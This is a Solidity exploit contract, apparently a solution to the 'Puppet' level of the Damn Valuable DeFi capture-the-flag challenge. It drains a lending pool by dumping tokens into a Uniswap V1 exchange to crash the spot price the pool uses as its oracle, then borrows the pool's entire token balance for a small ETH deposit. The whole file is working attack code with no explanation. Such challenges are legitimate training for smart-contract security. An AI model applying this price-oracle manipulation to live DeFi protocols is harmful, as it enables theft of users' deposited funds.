// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {PuppetPool} from "./PuppetPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {IUniswapV1Exchange} from "./IUniswapV1Exchange.sol";

contract AttackPuppet{
    PuppetPool immutable pool;
    IUniswapV1Exchange immutable exchange;
    DamnValuableToken immutable token;
    address immutable recovery;
    address immutable owner;
    
    constructor(PuppetPool _pool,IUniswapV1Exchange _exchange,DamnValuableToken _token,address _recovery){
        pool = _pool;
        exchange  = _exchange;
        token = _token;
        recovery = _recovery;
        owner = msg.sender;
        
    }
    
    function attack() external payable {
        require(token.transferFrom(msg.sender, address(this), token.balanceOf(owner)),"Token transfer failed");
        token.approve(address(exchange), 1000e18); 
        uint token_needed = exchange.getTokenToEthOutputPrice(99e17);
        exchange.tokenToEthSwapOutput(99e17,token_needed,block.timestamp + 300);
        uint borrow_needed = pool.calculateDepositRequired(token.balanceOf(address(pool)));
        pool.borrow{value:borrow_needed}(token.balanceOf(address(pool)), recovery);
    }
    receive() external payable{

    }
}